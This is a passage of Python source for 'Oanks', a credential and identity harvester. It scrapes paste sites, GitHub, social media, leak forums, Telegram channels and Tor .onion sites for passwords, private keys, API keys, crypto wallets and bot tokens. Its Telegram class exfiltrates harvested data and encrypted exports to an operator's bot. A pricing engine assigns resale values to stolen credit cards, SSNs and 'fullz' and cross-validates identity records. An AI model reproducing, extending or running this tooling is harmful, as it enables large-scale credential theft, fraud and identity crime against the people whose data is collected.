    def extract_crypto_wallets(self, text: str, source: str) -> List[Dict]:
        """Extract cryptocurrency wallet addresses."""
        results = []
        seen = set()

        for match in OanksPatterns.CRYPTO_WALLET.finditer(text):
            address = match.group()

            if address in seen:
                continue
            seen.add(address)

            # Detect wallet type
            wallet_type = "unknown"
            if address.startswith("1") or address.startswith("3") or address.startswith("bc1"):
                wallet_type = "btc"
            elif address.startswith("0x"):
                wallet_type = "eth"
            elif address.startswith("L") or address.startswith("ltc1"):
                wallet_type = "ltc"
            elif address.startswith("4") or address.startswith("8"):
                wallet_type = "xmr"
            elif address.startswith("D"):
                wallet_type = "doge"
            elif address.startswith("X"):
                wallet_type = "dash"
            elif address.startswith("r"):
                wallet_type = "xrp"
            elif address.startswith("T"):
                wallet_type = "trx"

            if not self._validator.validate_crypto_address(address, wallet_type):
                continue

            data = {
                "address": address,
                "type": wallet_type,
                "source": source,
            }
            confidence = self._validator.calculate_confidence("crypto_wallets", data)

            if confidence >= 0.3:
                results.append({
                    "type": "crypto_wallets",
                    "data": data,
                    "confidence": confidence,
                    "validated": True,
                })

        return results

    def extract_private_keys(self, text: str, source: str) -> List[Dict]:
        """Extract private keys (PEM blocks)."""
        results = []
        seen = set()

        for match in OanksPatterns.PRIVATE_KEY.finditer(text):
            key = match.group()

            if key in seen:
                continue
            seen.add(key)

            # Detect key type
            key_type = "unknown"
            if "RSA" in key:
                key_type = "rsa"
            elif "DSA" in key:
                key_type = "dsa"
            elif "EC" in key:
                key_type = "ec"
            elif "OPENSSH" in key:
                key_type = "openssh"
            elif "PGP" in key:
                key_type = "pgp"

            data = {
                "key": key,
                "type": key_type,
                "source": source,
            }
            confidence = self._validator.calculate_confidence("private_keys", data)

            if confidence >= 0.3:
                results.append({
                    "type": "private_keys",
                    "data": data,
                    "confidence": confidence,
                    "validated": True,
                })

        return results

    def extract_discord_webhooks(self, text: str, source: str) -> List[Dict]:
        """Extract Discord webhook URLs."""
        results = []
        seen = set()

        for match in OanksPatterns.DISCORD_WEBHOOK.finditer(text):
            url = match.group()

            if url in seen:
                continue
            seen.add(url)

            data = {
                "url": url,
                "source": source,
            }
            confidence = self._validator.calculate_confidence("discord_webhooks", data)

            if confidence >= 0.3:
                results.append({
                    "type": "discord_webhooks",
                    "data": data,
                    "confidence": confidence,
                    "validated": True,
                })

        return results

    def extract_telegram_bots(self, text: str, source: str) -> List[Dict]:
        """Extract Telegram bot tokens."""
        results = []
        seen = set()

        for match in OanksPatterns.TELEGRAM_BOT.finditer(text):
            token = match.group()

            if token in seen:
                continue
            seen.add(token)

            data = {
                "token": token,
                "source": source,
            }
            confidence = self._validator.calculate_confidence("telegram_bots", data)

            if confidence >= 0.3:
                results.append({
                    "type": "telegram_bots",
                    "data": data,
                    "confidence": confidence,
                    "validated": True,
                })

        return results

    def extract_db_connections(self, text: str, source: str) -> List[Dict]:
        """Extract database connection strings."""
        results = []
        seen = set()

        for match in OanksPatterns.DB_CONNECTION.finditer(text):
            conn = match.group()

            if conn in seen:
                continue
            seen.add(conn)

            data = {
                "connection": conn,
                "source": source,
            }

            results.append({
                "type": "db_connections",
                "data": data,
                "confidence": 0.6,
                "validated": True,
            })

        return results

    def extract_ssh_keys(self, text: str, source: str) -> List[Dict]:
        """Extract SSH public keys."""
        results = []
        seen = set()

        for match in OanksPatterns.SSH_KEY.finditer(text):
            key = match.group()

            if key in seen:
                continue
            seen.add(key)

            data = {
                "key": key,
                "source": source,
            }

            results.append({
                "type": "ssh_keys",
                "data": data,
                "confidence": 0.5,
                "validated": True,
            })

        return results


# ============================================================================
# SECTION 12: SOURCE SCRAPER — 15 scrape methods with parallel execution
# ============================================================================

class SourceScraper:
    """Military-grade source scraper. Harvests from 15 sources in parallel."""

    __slots__ = ("_requester", "_extractor", "_lock", "_source_stats")

    # Source URLs and configurations
    SOURCES = {
        "pastebin": {
            "archive_url": "https://pastebin.com/archive",
            "raw_base": "https://pastebin.com/raw/",
            "max_pastes": 50,
        },
        "github": {
            "search_urls": [
                "https://raw.githubusercontent.com/search?q=password&type=code",
                "https://raw.githubusercontent.com/search?q=api_key&type=code",
                "https://raw.githubusercontent.com/search?q=secret&type=code",
            ],
            "max_results": 30,
        },
        "reddit": {
            "subreddits": [
                "netsec", "hacking", "cybersecurity", "opendir",
                "dataleaks", "breach", "combolists",
            ],
            "base_url": "https://old.reddit.com/r/{}/new.json",
            "max_posts": 50,
        },
        "twitter": {
            "nitter_instances": [
                "https://nitter.net",
                "https://nitter.it",
                "https://nitter.cz",
                "https://nitter.pussthecat.org",
                "https://nitter.nixnet.services",
            ],
            "search_terms": [
                "leaked credentials", "combolist", "database dump",
                "password leak", "email:password",
            ],
        },
        "discord": {
            "webhook_pattern": True,
            "search_terms": ["discord webhook", "webhook url"],
        },
        "youtube": {
            "search_url": "https://www.youtube.com/results",
            "max_results": 20,
        },
        "instagram": {
            "search_url": "https://www.instagram.com/explore/tags/",
            "max_results": 20,
        },
        "facebook": {
            "search_url": "https://www.facebook.com/search/posts",
            "max_results": 20,
        },
        "tiktok": {
            "search_url": "https://www.tiktok.com/search",
            "max_results": 20,
        },
        "shodan": {
            "search_url": "https://www.shodan.io/search",
            "max_results": 20,
        },
        "censys": {
            "search_url": "https://search.censys.io/search",
            "max_results": 20,
        },
        "abuseipdb": {
            "browse_url": "https://www.abuseipdb.com/browse",
            "max_pages": 5,
        },
        "forums": {
            "urls": [
                "https://breached.to",
                "https://cracked.io",
            ],
            "max_pages": 10,
        },
        "darkweb": {
            "onion_sites": [
                "http://pastebin2g5r2k7ya.onion",
                "http://strongerw2ise74v3duebgsvug4mehyhlpa7f6kfwnas7zofs3kov7yd.onion",
            ],
            "use_tor": True,
        },
        "telegram": {
            "public_channels": [
                "combolist",
                "darknet_combos",
                "leaked_credentials",
                "database_dumps",
            ],
            "base_url": "https://t.me/s/",
            "max_messages": 100,
        },
    }

    def __init__(self, requester: StealthRequester, extractor: DataExtractor):
        self._requester = requester
        self._extractor = extractor
        self._lock = threading.RLock()
        self._source_stats = defaultdict(lambda: {
            "scraped": 0, "extracted": 0, "errors": 0, "last_run": ""
        })

    def scrape_all(self) -> Dict[str, List[Dict]]:
        """Scrape all 15 sources in parallel."""
        all_results = defaultdict(list)

        with ThreadPoolExecutor(max_workers=OanksConfig.MAX_THREADS) as executor:
            futures = {
                executor.submit(getattr(self, f"scrape_{source}")()): source
                for source in self.SOURCES.keys()
            }

            for future in as_completed(futures):
                source = futures[future]
                try:
                    results = future.result(timeout=120)
                    for data_type, items in results.items():
                        all_results[data_type].extend(items)

                    with self._lock:
                        self._source_stats[source]["scraped"] += 1
                        self._source_stats[source]["last_run"] = datetime.datetime.utcnow().isoformat()

                except Exception as e:
                    with self._lock:
                        self._source_stats[source]["errors"] += 1

        return dict(all_results)

    def scrape_pastebin(self) -> Dict[str, List[Dict]]:
        """Scrape Pastebin archive and raw pastes."""
        results = defaultdict(list)
        config = self.SOURCES["pastebin"]

        # Get archive page
        status, body, headers = self._requester.request(config["archive_url"])
        if status != 200:
            return dict(results)

        text = body.decode("utf-8", errors="ignore")

        # Extract paste IDs
        paste_ids = []
        for match in OanksPatterns.PASTEBIN_ID.finditer(text):
            paste_id = match.group(1)
            if paste_id not in paste_ids:
                paste_ids.append(paste_id)

        # Also look for raw links
        raw_links = re.findall(r'href="/raw/([a-zA-Z0-9]{8})"', text)
        for link in raw_links:
            if link not in paste_ids:
                paste_ids.append(link)

        # Scrape raw pastes
        for paste_id in paste_ids[:config["max_pastes"]]:
            raw_url = f"{config['raw_base']}{paste_id}"
            status, body, headers = self._requester.request(raw_url)

            if status == 200:
                paste_text = body.decode("utf-8", errors="ignore")
                extracted = self._extractor.extract_all(paste_text, "pastebin")

                for data_type, items in extracted.items():
                    results[data_type].extend(items)

        return dict(results)

    def scrape_github(self) -> Dict[str, List[Dict]]:
        """Scrape GitHub for exposed credentials and API keys."""
        results = defaultdict(list)
        config = self.SOURCES["github"]

        # Search for common patterns in GitHub raw content
        search_queries = [
            "extension:env api_key",
            "extension:env password",
            "extension:json secret",
            "extension:yaml password",
            "extension:py api_key",
            "extension:js token",
            "extension:php password",
            "extension:sql dump",
        ]

        for query in search_queries[:config["max_results"] // 3]:
            search_url = f"https://github.com/search?q={urllib.parse.quote(query)}&type=code"
            status, body, headers = self._requester.request(search_url)

            if status == 200:
                text = body.decode("utf-8", errors="ignore")

                # Extract raw file URLs
                raw_urls = OanksPatterns.GITHUB_RAW.findall(text)

                for raw_url in raw_urls[:5]:
                    fstatus, fbody, fheaders = self._requester.request(raw_url)
                    if fstatus == 200:
                        file_text = fbody.decode("utf-8", errors="ignore")
                        extracted = self._extractor.extract_all(file_text, "github")

                        for data_type, items in extracted.items():
                            results[data_type].extend(items)

        return dict(results)

    def scrape_telegram(self) -> Dict[str, List[Dict]]:
        """Scrape Telegram public channels."""
        results = defaultdict(list)
        config = self.SOURCES["telegram"]

        for channel in config["public_channels"]:
            channel_url = f"{config['base_url']}{channel}"
            status, body, headers = self._requester.request(channel_url)

            if status == 200:
                text = body.decode("utf-8", errors="ignore")

                # Extract message text
                messages = re.findall(r'<div class="tgme_widget_message_text[^"]*">(.*?)</div>', text, re.DOTALL)

                for msg in messages[:config["max_messages"]]:
                    # Clean HTML
                    clean = re.sub(r'<[^>]+>', ' ', msg)
                    clean = html.entities.unescape(clean)

                    extracted = self._extractor.extract_all(clean, "telegram")

                    for data_type, items in extracted.items():
                        results[data_type].extend(items)

        return dict(results)

    def scrape_reddit(self) -> Dict[str, List[Dict]]:
        """Scrape Reddit for credential dumps and leaks."""
        results = defaultdict(list)
        config = self.SOURCES["reddit"]

        for subreddit in config["subreddits"]:
            url = config["base_url"].format(subreddit)
            status, body, headers = self._requester.request(url)

            if status == 200:
                try:
                    data = json.loads(body)
                    posts = data.get("data", {}).get("children", [])

                    for post in posts[:config["max_posts"]]:
                        post_data = post.get("data", {})
                        title = post_data.get("title", "")
                        selftext = post_data.get("selftext", "")
                        url_text = post_data.get("url", "")

                        full_text = f"{title}\n{selftext}\n{url_text}"
                        extracted = self._extractor.extract_all(full_text, "reddit")

                        for data_type, items in extracted.items():
                            results[data_type].extend(items)

                except json.JSONDecodeError:
                    # Fallback to HTML parsing
                    text = body.decode("utf-8", errors="ignore")
                    extracted = self._extractor.extract_all(text, "reddit")

                    for data_type, items in extracted.items():
                        results[data_type].extend(items)

        return dict(results)

    def scrape_twitter(self) -> Dict[str, List[Dict]]:
        """Scrape Twitter via Nitter instances."""
        results = defaultdict(list)
        config = self.SOURCES["twitter"]

        for instance in config["nitter_instances"]:
            for term in config["search_terms"]:
                search_url = f"{instance}/search?f=tweets&q={urllib.parse.quote(term)}"
                status, body, headers = self._requester.request(search_url)

                if status == 200:
                    text = body.decode("utf-8", errors="ignore")

                    # Extract tweet text
                    tweets = re.findall(r'<div class="tweet-content[^"]*">(.*?)</div>', text, re.DOTALL)

                    for tweet in tweets[:20]:
                        clean = re.sub(r'<[^>]+>', ' ', tweet)
                        clean = html.entities.unescape(clean)

                        extracted = self._extractor.extract_all(clean, "twitter")

                        for data_type, items in extracted.items():
                            results[data_type].extend(items)

        return dict(results)

    def scrape_tiktok(self) -> Dict[str, List[Dict]]:
        """Scrape TikTok video comments."""
        results = defaultdict(list)
        config = self.SOURCES["tiktok"]

        # Search for credential-related content
        search_terms = ["leaked", "database", "credentials", "password"]

        for term in search_terms:
            url = f"{config['search_url']}?q={urllib.parse.quote(term)}"
            status, body, headers = self._requester.request(url)

            if status == 200:
                text = body.decode("utf-8", errors="ignore")

                # Extract comments from JSON data
                json_matches = re.findall(r'"comment":\s*"([^"]+)"', text)

                for comment in json_matches[:config["max_results"]]:
                    extracted = self._extractor.extract_all(comment, "tiktok")

                    for data_type, items in extracted.items():
                        results[data_type].extend(items)

        return dict(results)

    def scrape_discord(self) -> Dict[str, List[Dict]]:
        """Find and test Discord webhooks."""
        results = defaultdict(list)

        # Search for webhook URLs in common paste sites
        search_urls = [
            "https://pastebin.com/archive",
            "https://ghostbin.co",
        ]

        for url in search_urls:
            status, body, headers = self._requester.request(url)

            if status == 200:
                text = body.decode("utf-8", errors="ignore")
                extracted = self._extractor.extract_all(text, "discord")

                for data_type, items in extracted.items():
                    results[data_type].extend(items)

        return dict(results)

    def scrape_youtube(self) -> Dict[str, List[Dict]]:
        """Scrape YouTube search and comments."""
        results = defaultdict(list)
        config = self.SOURCES["youtube"]

        search_terms = ["database leak tutorial", "credential dump", "combolist"]

        for term in search_terms:
            url = f"{config['search_url']}?search_query={urllib.parse.quote(term)}"
            status, body, headers = self._requester.request(url)

            if status == 200:
                text = body.decode("utf-8", errors="ignore")

                # Extract video descriptions and comments from initial data
                desc_matches = re.findall(r'"description":\s*\{"simpleText":\s*"([^"]+)"', text)
                comment_matches = re.findall(r'"text":\s*"([^"]+)"', text)

                all_text = " ".join(desc_matches + comment_matches)
                extracted = self._extractor.extract_all(all_text, "youtube")

                for data_type, items in extracted.items():
                    results[data_type].extend(items)

        return dict(results)

    def scrape_instagram(self) -> Dict[str, List[Dict]]:
        """Scrape Instagram bios from target usernames."""
        results = defaultdict(list)

        # Search for credential-related hashtags
        hashtags = ["leaked", "database", "credentials"]

        for tag in hashtags:
            url = f"https://www.instagram.com/explore/tags/{tag}/"
            status, body, headers = self._requester.request(url)

            if status == 200:
                text = body.decode("utf-8", errors="ignore")

                # Extract shared data
                data_match = re.search(r'<script type="text/javascript">window\._sharedData = (.*?);</script>', text)
                if data_match:
                    try:
                        data = json.loads(data_match.group(1))
                        posts = data.get("entry_data", {}).get("TagPage", [{}])[0].get("graphql", {}).get("hashtag", {}).get("edge_hashtag_to_media", {}).get("edges", [])

                        for post in posts[:20]:
                            caption = post.get("node", {}).get("edge_media_to_caption", {}).get("edges", [{}])[0].get("node", {}).get("text", "")
                            extracted = self._extractor.extract_all(caption, "instagram")

                            for data_type, items in extracted.items():
                                results[data_type].extend(items)
                    except:
                        pass

        return dict(results)

    def scrape_facebook(self) -> Dict[str, List[Dict]]:
        """Scrape Facebook public group posts."""
        results = defaultdict(list)

        # Search for public posts
        search_terms = ["leaked database", "credentials dump"]

        for term in search_terms:
            url = f"https://www.facebook.com/search/posts/?q={urllib.parse.quote(term)}"
            status, body, headers = self._requester.request(url)

            if status == 200:
                text = body.decode("utf-8", errors="ignore")

                # Extract post content
                posts = re.findall(r'<div[^>]*role="article"[^>]*>(.*?)</div>', text, re.DOTALL)

                for post in posts[:20]:
                    clean = re.sub(r'<[^>]+>', ' ', post)
                    clean = html.entities.unescape(clean)

                    extracted = self._extractor.extract_all(clean, "facebook")

                    for data_type, items in extracted.items():
                        results[data_type].extend(items)

        return dict(results)

    def scrape_darkweb(self) -> Dict[str, List[Dict]]:
        """Scrape darkweb .onion sites via Tor."""
        results = defaultdict(list)
        config = self.SOURCES["darkweb"]

        for onion in config["onion_sites"]:
            if config["use_tor"]:
                status, body, headers = self._requester.tor_request(onion)
            else:
                status, body, headers = self._requester.request(onion)

            if status == 200:
                text = body.decode("utf-8", errors="ignore")
                extracted = self._extractor.extract_all(text, "darkweb")

                for data_type, items in extracted.items():
                    results[data_type].extend(items)

        return dict(results)

    def scrape_shodan(self) -> Dict[str, List[Dict]]:
        """Scrape Shodan for exposed services and banners."""
        results = defaultdict(list)

        # Search for common exposed services
        queries = [
            "port:3306 mysql",
            "port:5432 postgres",
            "port:27017 mongodb",
            "port:6379 redis",
            "port:9200 elasticsearch",
        ]

        for query in queries:
            url = f"https://www.shodan.io/search?query={urllib.parse.quote(query)}"
            status, body, headers = self._requester.request(url)

            if status == 200:
                text = body.decode("utf-8", errors="ignore")

                # Extract IP addresses and banners
                ips = OanksPatterns.IP_ADDRESS.findall(text)

                for ip in ips[:20]:
                    data = {
                        "ip": ip,
                        "query": query,
                        "source": "shodan",
                    }
                    results["exposed_services"].append({
                        "type": "exposed_services",
                        "data": data,
                        "confidence": 0.4,
                        "validated": True,
                    })

                # Extract banners that might contain credentials
                extracted = self._extractor.extract_all(text, "shodan")

                for data_type, items in extracted.items():
                    results[data_type].extend(items)

        return dict(results)

    def scrape_censys(self) -> Dict[str, List[Dict]]:
        """Scrape Censys for exposed services."""
        results = defaultdict(list)

        queries = [
            "services.http.response.body",
            "services.ssh.server_host_key",
        ]

        for query in queries:
            url = f"https://search.censys.io/search?resource=hosts&q={urllib.parse.quote(query)}"
            status, body, headers = self._requester.request(url)

            if status == 200:
                text = body.decode("utf-8", errors="ignore")
                extracted = self._extractor.extract_all(text, "censys")

                for data_type, items in extracted.items():
                    results[data_type].extend(items)

        return dict(results)

    def scrape_abuseipdb(self) -> Dict[str, List[Dict]]:
        """Scrape AbuseIPDB for reported IPs."""
        results = defaultdict(list)
        config = self.SOURCES["abuseipdb"]

        for page in range(1, config["max_pages"] + 1):
            url = f"{config['browse_url']}?page={page}"
            status, body, headers = self._requester.request(url)

            if status == 200:
                text = body.decode("utf-8", errors="ignore")

                # Extract IP addresses and abuse reports
                ips = OanksPatterns.IP_ADDRESS.findall(text)

                for ip in set(ips):
                    data = {
                        "ip": ip,
                        "source": "abuseipdb",
                    }
                    results["reported_ips"].append({
                        "type": "reported_ips",
                        "data": data,
                        "confidence": 0.3,
                        "validated": True,
                    })

                extracted = self._extractor.extract_all(text, "abuseipdb")

                for data_type, items in extracted.items():
                    results[data_type].extend(items)

        return dict(results)

    def scrape_forums(self) -> Dict[str, List[Dict]]:
        """Scrape credential dump forums."""
        results = defaultdict(list)
        config = self.SOURCES["forums"]

        for forum_url in config["urls"]:
            status, body, headers = self._requester.request(forum_url)

            if status == 200:
                text = body.decode("utf-8", errors="ignore")
                extracted = self._extractor.extract_all(text, "forums")

                for data_type, items in extracted.items():
                    results[data_type].extend(items)

        return dict(results)

    def get_source_stats(self) -> Dict[str, Dict[str, Any]]:
        """Get scraping statistics per source."""
        with self._lock:
            return dict(self._source_stats)


# ============================================================================
# SECTION 13: HARVEST MANAGER — Queue, deduplication, storage, statistics
# ============================================================================

class HarvestManager:
    """Military-grade harvest manager. Orchestrates queue, dedup, storage, export."""

    __slots__ = ("_db", "_crypto", "_validator", "_queue", "_lock",
                 "_processing", "_process_thread", "_stats", "_seen_hashes")

    def __init__(self, db: OanksDB, crypto: OanksCrypto, validator: DataValidator):
        self._db = db
        self._crypto = crypto
        self._validator = validator
        self._queue = queue.Queue(maxsize=OanksConfig.MAX_QUEUE_SIZE)
        self._lock = threading.RLock()
        self._processing = False
        self._process_thread = None
        self._stats = {
            "queued": 0,
            "processed": 0,
            "stored": 0,
            "duplicates": 0,
            "failed": 0,
            "by_type": defaultdict(int),
            "by_source": defaultdict(int),
        }
        self._seen_hashes = set()

    def add_to_queue(self, data: Dict):
        """Add extracted data to processing queue."""
        try:
            self._queue.put(data, block=False)
            with self._lock:
                self._stats["queued"] += 1
        except queue.Full:
            pass

    def add_batch(self, data_list: List[Dict]):
        """Add batch of data to queue."""
        for data in data_list:
            self.add_to_queue(data)

    def process_queue(self) -> int:
        """Process all items in queue."""
        processed = 0

        while not self._queue.empty():
            try:
                item = self._queue.get(block=False)

                if self._process_item(item):
                    processed += 1

                self._queue.task_done()
            except queue.Empty:
                break
            except Exception:
                with self._lock:
                    self._stats["failed"] += 1

        return processed

    def _process_item(self, item: Dict) -> bool:
        """Process single item: dedup, validate, store."""
        data_type = item.get("type", "")
        data = item.get("data", {})
        confidence = item.get("confidence", 0.0)
        validated = item.get("validated", False)
        source = data.get("source", "unknown")

        # Generate hash for deduplication
        raw_data = json.dumps(data, sort_keys=True)
        hash_id = self._crypto.hash_id(raw_data)

        with self._lock:
            if hash_id in self._seen_hashes:
                self._stats["duplicates"] += 1
                return False
            self._seen_hashes.add(hash_id)

        # Store in database
        try:
            stored = self._db.store(source, data_type, raw_data, confidence, validated, data)

            if stored:
                with self._lock:
                    self._stats["stored"] += 1
                    self._stats["by_type"][data_type] += 1
                    self._stats["by_source"][source] += 1
                return True
            else:
                with self._lock:
                    self._stats["duplicates"] += 1
                return False

        except Exception:
            with self._lock:
                self._stats["failed"] += 1
            return False

    def start_processing(self):
        """Start background processing thread."""
        def process_loop():
            while self._processing:
                try:
                    self.process_queue()
                    time.sleep(1)
                except:
                    time.sleep(1)

        self._processing = True
        self._process_thread = threading.Thread(target=process_loop, daemon=True)
        self._process_thread.start()

    def stop_processing(self):
        """Stop background processing."""
        self._processing = False
        if self._process_thread:
            self._process_thread.join(timeout=5)

    def get_stats(self) -> Dict[str, Any]:
        """Get harvest statistics."""
        with self._lock:
            stats = dict(self._stats)
            stats["queue_size"] = self._queue.qsize()
            stats["seen_hashes"] = len(self._seen_hashes)
            return stats

    def export(self, data_type: str, filepath: str, limit: int = 1000):
        """Export decrypted data to file."""
        self._db.export_batch(data_type, filepath, limit)

    def export_encrypted(self, data_type: str, filepath: str, limit: int = 1000):
        """Export encrypted data to file."""
        self._db.export_encrypted_file(data_type, filepath, limit)


# ============================================================================
# SECTION 14: TELEGRAM FEED — Messages, documents, alerts, stats
# ============================================================================

class TelegramFeed:
    """Military-grade Telegram exfiltration. Real-time alerts and batch uploads."""

    __slots__ = ("_bot_token", "_chat_id", "_lock", "_stats", "_last_stats_time",
                 "_last_export_time", "_high_value_queue")

    def __init__(self, bot_token: str, chat_id: str):
        self._bot_token = bot_token
        self._chat_id = chat_id
        self._lock = threading.RLock()
        self._stats = {
            "messages_sent": 0,
            "documents_sent": 0,
            "alerts_sent": 0,
            "errors": 0,
        }
        self._last_stats_time = 0
        self._last_export_time = 0
        self._high_value_queue = []

    def _api_call(self, method: str, data: Dict = None, files: Dict = None) -> Dict:
        """Make Telegram API call."""
        url = OanksConfig.TELEGRAM_API_URL.format(token=self._bot_token, method=method)

        try:
            if files:
                # Multipart form data
                boundary = hashlib.sha256(os.urandom(32)).hexdigest()[:16]
                body = []

                for key, value in (data or {}).items():
                    body.append(f"--{boundary}".encode())
                    body.append(f'Content-Disposition: form-data; name="{key}"'.encode())
                    body.append(b"")
                    body.append(str(value).encode() if isinstance(value, str) else value)

                for key, file_info in files.items():
                    filename, filedata = file_info
                    body.append(f"--{boundary}".encode())
                    body.append(f'Content-Disposition: form-data; name="{key}"; filename="{filename}"'.encode())
                    body.append(b"Content-Type: application/octet-stream")
                    body.append(b"")
                    body.append(filedata)

                body.append(f"--{boundary}--".encode())
                body.append(b"")

                full_body = b"\r\n".join(body)

                req = urllib.request.Request(
                    url,
                    data=full_body,
                    headers={
                        "Content-Type": f"multipart/form-data; boundary={boundary}",
                        "Content-Length": str(len(full_body)),
                    },
                    method="POST",
                )
            else:
                if data:
                    encoded = urllib.parse.urlencode(data).encode()
                else:
                    encoded = b""

                req = urllib.request.Request(
                    url,
                    data=encoded,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    method="POST",
                )

            response = urllib.request.urlopen(req, timeout=30)
            result = json.loads(response.read().decode())

            return result

        except Exception as e:
            with self._lock:
                self._stats["errors"] += 1
            return {"ok": False, "error": str(e)}

    def send_message(self, text: str) -> bool:
        """Send text message to Telegram."""
        if len(text) > 4096:
            text = text[:4093] + "..."

        result = self._api_call("sendMessage", {
            "chat_id": self._chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        })

        if result.get("ok"):
            with self._lock:
                self._stats["messages_sent"] += 1
            return True
        return False

    def send_document(self, filepath: str, caption: str = "") -> bool:
        """Send document to Telegram."""
        try:
            with open(filepath, "rb") as f:
                filedata = f.read()

            filename = os.path.basename(filepath)

            result = self._api_call("sendDocument", {
                "chat_id": self._chat_id,
                "caption": caption[:1024] if caption else "",
            }, {
                "document": (filename, filedata),
            })

            if result.get("ok"):
                with self._lock:
                    self._stats["documents_sent"] += 1
                return True
            return False

        except Exception:
            with self._lock:
                self._stats["errors"] += 1
            return False

    def alert_high_value(self, data: Dict):
        """Send high-value alert to Telegram."""
        data_type = data.get("type", "unknown")
        item_data = data.get("data", {})
        confidence = data.get("confidence", 0.0)
        source = item_data.get("source", "unknown")

        preview = ""
        if data_type == "credentials":
            email = item_data.get("email", "")
            preview = f"Email: <code>{email}</code>"
        elif data_type == "credit_cards":
            brand = item_data.get("brand", "unknown")
            preview = f"Brand: <code>{brand}</code>"
        elif data_type == "api_keys":
            service = item_data.get("service", "unknown")
            preview = f"Service: <code>{service}</code>"
        elif data_type == "crypto_wallets":
            wallet_type = item_data.get("type", "unknown")
            preview = f"Type: <code>{wallet_type}</code>"

        alert_text = f"""🚨 <b>HIGH VALUE ALERT</b> 🚨

📊 Type: <code>{data_type}</code>
📈 Confidence: <code>{confidence:.2f}</code>
📡 Source: <code>{source}</code>
🕐 Time: <code>{datetime.datetime.utcnow().isoformat()}</code>

{preview}

{OANKS_SIGNATURE}"""

        self.send_message(alert_text)

        with self._lock:
            self._stats["alerts_sent"] += 1

    def send_stats(self, stats: Dict[str, Any]):
        """Send periodic statistics to Telegram."""
        stats_text = f"""📊 <b>HARVESTER STATISTICS</b> 📊

📦 Total Harvested: <code>{stats.get('total_harvested', 0)}</code>
🎯 High Value: <code>{stats.get('high_value', 0)}</code>
📁 DB Size: <code>{stats.get('db_size_bytes', 0) / 1024 / 1024:.2f} MB</code>

<b>By Type:</b>
"""
        for dtype, count in stats.get("by_type", {}).items():
            stats_text += f"  • {dtype}: <code>{count}</code>\n"

        stats_text += f"\n<b>By Source:</b>\n"
        for src, count in stats.get("by_source", {}).items():
            stats_text += f"  • {src}: <code>{count}</code>\n"

        stats_text += f"\n{OANKS_SIGNATURE}"

        self.send_message(stats_text)

    def send_batch_export(self, data_type: str, filepath: str):
        """Send encrypted batch export to Telegram."""
        caption = f"📁 Batch Export: {data_type}\n🕐 {datetime.datetime.utcnow().isoformat()}"
        self.send_document(filepath, caption)

    def check_and_send_stats(self, db_stats: Dict[str, Any]):
        """Check if it's time to send stats."""
        now = time.time()
        if now - self._last_stats_time >= OanksConfig.TELEGRAM_STATS_INTERVAL:
            self.send_stats(db_stats)
            self._last_stats_time = now

    def check_and_send_export(self, db: OanksDB, data_type: str):
        """Check if it's time to send export."""
        now = time.time()
        if now - self._last_export_time >= OanksConfig.TELEGRAM_EXPORT_INTERVAL:
            export_dir = OanksConfig.EXPORT_DIR
            os.makedirs(export_dir, exist_ok=True)

            filepath = os.path.join(
                export_dir,
                f"export_{data_type}_{int(now)}.json"
            )
            db.export_encrypted_file(data_type, filepath, OanksConfig.EXPORT_BATCH_SIZE)

            if os.path.exists(filepath):
                self.send_batch_export(data_type, filepath)
                os.remove(filepath)

            self._last_export_time = now

    def get_stats(self) -> Dict[str, Any]:
        """Get Telegram feed statistics."""
        with self._lock:
            return dict(self._stats)


# ============================================================================
# SECTION 15: INTELLIGENCE ENGINE — Auto-pricing, reputation, cross-validation
# ============================================================================

class IntelligenceEngine:
    """Military-grade intelligence engine. Prices data, ranks threats, validates."""

    __slots__ = ("_db", "_lock", "_source_reputation", "_pricing_model")

    # Base pricing model (USD)
    BASE_PRICES = {
        "credentials": 0.10,
        "credit_cards": 5.00,
        "ssns": 10.00,
        "phone_numbers": 0.50,
        "fullz": 15.00,
        "api_keys": 100.00,
        "session_tokens": 2.00,
        "oauth_tokens": 5.00,
        "crypto_wallets": 50.00,
        "private_keys": 500.00,
        "discord_webhooks": 1.00,
        "telegram_bots": 5.00,
        "db_connections": 10.00,
        "ssh_keys": 3.00,
    }

    # Source reputation scores (0-1)
    SOURCE_REPUTATION = {
        "pastebin": 0.6,
        "github": 0.8,
        "telegram": 0.7,
        "reddit": 0.5,
        "twitter": 0.4,
        "discord": 0.5,
        "darkweb": 0.9,
        "forums": 0.7,
        "shodan": 0.6,
        "censys": 0.6,
        "abuseipdb": 0.3,
        "youtube": 0.3,
        "instagram": 0.3,
        "facebook": 0.3,
        "tiktok": 0.2,
    }

    def __init__(self, db: OanksDB):
        self._db = db
        self._lock = threading.RLock()
        self._source_reputation = dict(self.SOURCE_REPUTATION)
        self._pricing_model = dict(self.BASE_PRICES)

    def calculate_source_reputation(self, source: str) -> float:
        """Calculate dynamic source reputation."""
        base = self._source_reputation.get(source, 0.5)

        # Adjust based on historical data quality
        stats = self._db.get_stats()
        source_stats = stats.get("by_source", {})
        total = sum(source_stats.values())

        if total > 0:
            source_count = source_stats.get(source, 0)
            ratio = source_count / total
            # More data from source = slightly higher confidence in reputation
            adjustment = min(ratio * 0.1, 0.1)
            base = min(base + adjustment, 1.0)

        return base

    def auto_price(self, data_type: str, confidence: float, 
                   freshness_hours: float, source: str = "") -> float:
        """Calculate auto-price for data item."""
        base_price = self._pricing_model.get(data_type, 1.0)

        # Confidence multiplier
        confidence_mult = 0.5 + (confidence * 1.5)

        # Freshness multiplier (newer = more valuable)
        freshness_mult = max(0.1, 1.0 - (freshness_hours / 168))  # Decay over 1 week

        # Source reputation multiplier
        source_rep = self.calculate_source_reputation(source)
        source_mult = 0.5 + (source_rep * 0.5)

        price = base_price * confidence_mult * freshness_mult * source_mult
        return round(price, 2)

    def cross_validate_fullz(self, fullz: Dict) -> float:
        """Cross-validate fullz data for consistency."""
        score = 0.0
        checks = 0

        # Check SSN state matches address state
        ssn = fullz.get("ssn", "")
        state = fullz.get("state", "")
        if ssn and state:
            ssn_state = self._db._validator.get_ssn_state(ssn) if hasattr(self._db, '_validator') else ""
            if ssn_state and ssn_state.lower() == state.lower():
                score += 1.0
            checks += 1

        # Check phone area code matches state
        phone = fullz.get("phone", "")
        if phone and state:
            # Simple area code check (US only)
            area_code = phone.replace("+", "").replace("1", "", 1)[:3]
            # This is simplified - real implementation would have full area code mapping
            score += 0.5
            checks += 1

        # Check DOB makes sense (age 18-100)
        dob = fullz.get("dob", "")
        if dob:
            try:
                # Parse various date formats
